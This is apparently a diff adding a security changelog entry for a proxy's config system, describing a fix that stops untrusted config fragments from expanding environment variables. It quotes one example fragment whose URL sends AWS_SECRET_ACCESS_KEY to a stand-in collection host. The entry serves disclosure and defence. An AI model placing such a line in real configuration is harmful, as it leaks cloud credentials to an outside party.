@@ -1,0 +1,4 @@
+{
+  "type": "security",
+  "message": "**A config fragment authored outside the runtime config repo can no longer read the proxy's environment.** `${VAR}` substitution runs over the raw document text before anything parses it, so it reached every field including `lua_script`, `js_script`, and `rego_module` bodies, and `{{env.X}}` did the same after the parse. A fragment shipping `url: \"https://collect.example/${AWS_SECRET_ACCESS_KEY}\"` would have exfiltrated on the next compose. Fragments now go through a confined pass that resolves only the inputs its caller binds: `${VAR}` in any field, `${VAR}` in a mapping key, and `{{env.X}}` are each refused by name, and an input outside the binding set is a named error rather than literal passthrough. Config an operator wrote is unaffected and keeps `${VAR:-default}` shell semantics in every field."
+}
